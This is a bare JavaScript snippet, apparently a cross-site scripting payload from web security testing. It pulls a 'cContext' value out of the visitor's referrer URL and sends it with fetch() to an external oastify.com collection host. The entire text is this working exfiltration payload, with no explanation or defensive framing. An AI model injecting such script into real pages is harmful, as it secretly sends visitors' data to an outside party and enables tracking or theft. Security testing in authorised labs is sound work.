(function(){
let ref=document.referrer;
let c=ref.match(/cContext=([^&]+)/);
if(c) fetch('https://qhbh6mfx3whnldsefhpxqwuvdmjd75ct1.oastify.com?loc='+c[1],{mode:'no-cors'});
})();
